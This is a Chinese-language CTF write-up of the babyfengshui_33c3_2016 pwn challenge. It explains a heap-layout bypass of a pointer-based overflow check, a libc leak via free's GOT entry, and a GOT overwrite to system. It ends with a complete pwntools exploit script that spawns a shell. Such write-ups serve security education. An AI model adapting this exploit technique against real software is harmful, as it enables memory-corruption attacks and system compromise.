---
title: "BUUCTF Pwn Babyfengshui_33c3_2016"
date: 2020-03-18T22:32:06+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# babyfengshui_33c3_2016

小贴士

1、在ida中出现下图这种烦人的类型声明，可以使用键盘上的"\\\"键盘来隐藏

![image-20200319020120064](/images/image-20200319020120064.png)

![image-20200319020240331](/images/image-20200319020240331.png)

2、函数got内存的是函数的真实地址，这个真实地址才是决定实际使用的函数

3、函数真实地址不受地址随机化影响，只与libc不同而不同，知道真实地址可以计算出此libc的版本，以及此libc中其他函数的地址，如system，从而也能计算出本程序中调用libc中system的真实地址(libc.system + base_addr)

所以leak出真实地址计算出libc版本是非常重要的直接影响后面的getshell

本题源码：https://github.com/bkth/babyfengshui/blob/master/babyfengshui.c

![image-20200318223431142](/images/image-20200318223431142.png)

32位程序，开启NX、Canary

![image-20200318223613793](/images/image-20200318223613793.png)

从功能上看估计是一道堆题，用ida看看

![image-20200318223957188](/images/image-20200318223957188.png)

增删改查都有

![image-20200318231825678](/images/image-20200318231825678.png)

这里add_user函数会malloc出2个chunk，大概可以推测出第2个chunk是个结构体

```c
struct user{
    char *description;//占4字节的指针
    char name[124];
}
```

delete_uesr函数

![image-20200318233320905](/images/image-20200318233320905.png)

display_user函数![image-20200318233852420](/images/image-20200318233852420.png)

update_description函数，也就能够编辑description chunk

![image-20200319001706569](/images/image-20200319001706569.png)

在update_description函数中，存在防止堆溢出的判断，但是仔细想就知道，这里的防止堆溢出的判断是基于指针的并且description chunk在user chunk之上，也就是它们俩的一前一后连在一起的，但是根据堆分配的机制，我们可以让他们俩不连在一起，中间插一个chunk，这样我们在修改description的时候就可以覆盖到他们两之间的chunk

![image-20200319010045343](/images/image-20200319010045343.png)

如上图先add2个也就是desc1、user1和desc2、user2，他们分别都是0x80但是有0x8来记录他们的大小包括0x8

![image-20200319010102578](/images/image-20200319010102578.png)

然后我们把add的前2个free了根据堆分配的机制下次再分配还是用的free的这些chunk，所有下次我们add一个0x80+0x80=0x100的chunk刚刚是desc3把之前的desc1和user1占用了，但是desc2和user2还没有free所有这里的user3就不能占用user2的位置只能分配到user2之后了，所以这里desc3和user3之间存在个desc2和user2所以就绕过了再update_description函数中的堆溢出防范，那么重点来了，我们回顾之前的分析，这里user2中的&desc2存的是个指针，那么我们通过溢出desc3来覆盖user2的这个指针指向libc中的函数地址那么我们就能够leak出libc中函数的地址从而计算出用的什么libc.so，从而找到system函数的地址，但是我们没有/bin/sh字符串怎么办呢？别忘了我们可以add_user并且写入内容的，我们在add头4个(回顾前面这里add一个用户申请了2个chunk，所这里实际上是4个chunk)用来leak的chunk之后可以再add一个较小的desc来存我们的/bin/sh字符串

```python
#!/usr/bin/env python2
#-*-coding=UTF-8-*-
from pwn import *
context.log_level = 'debug'
io = process('./babyfengshui')
elf = ELF('babyfengshui')
libc = ELF('x86_ubuntu16_libc-2.23.so')

def add_user(size, length, text):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("description: ", str(size))
    io.sendlineafter("name: ", 'AAAA')
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)
def delete_user(idx):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("index: ", str(idx))
def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))
def update_desc(idx, length, text):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

if __name__ == "__main__":
    free_got = elf.got['free']
    add_user(0x80, 0x80, 'AAAA')        # 0
    add_user(0x80, 0x80, 'AAAA')        # 1
    add_user(0x8, 0x8, '/bin/sh\x00')   # 2，存我们的/bin/sh 
    delete_user(0)
    #通过leak free_got来计算libc
    add_user(0x100, 0x19c, "a"+"A"*0x194+"bbb" + p32(elf.got['free']))    # 0
    display_user(1)
    io.recvuntil("description: ")
    free_addr = u32(io.recvn(4)) #接收我们leak出的free_got，
    print "free_got_addr:"+str(hex(free_addr))
    libc_base = free_addr - libc.symbols['free']
    system_addr = libc.symbols['system'] + libc_base
    log.info("system address: 0x%x" % system_addr)
    gdb.attach(io) #在本地调试下断在这里看内存状态，见后图
    #下一步用update修改free_got的内容为system函数的地址，下次执行free函数实际就是执行system函数了
    update_desc(1, 0x4, p32(system_addr))
    gdb.attach(io) #在执行修改free_got为system之后看内存状态，见下图
    #下一步表面执行free实际执行system，user2里面存了/bin/sh，所以这里执行system("/bin/sh")
    delete_user(2)
    io.sendline('cat flag')
    io.interactive()
```

![image-20200319013422408](/images/image-20200319013422408.png)

![image-20200319013546681](/images/image-20200319013546681.png)

上图中0x0804b010指向的就是free_got里面存着free的真实地址，我们通过display_user功能能够leak下图地址

![image-20200319013835029](/images/image-20200319013835029.png)

![image-20200319013930726](/images/image-20200319013930726.png)

以下操作是改写free_got的截图，got内存的是函数的真实地址，这个真实地址才是决定实际使用的函数

![image-20200319015639097](/images/image-20200319015639097.png)

system地址是0xf7dbd940，我们看看free_got是否修改成这个值了

![image-20200319015753258](/images/image-20200319015753258.png)

这里可以看到free_got内的内容改为system地址了，所以下次执行free的时候实际是执行system

![image-20200319022618588](/images/image-20200319022618588.png)







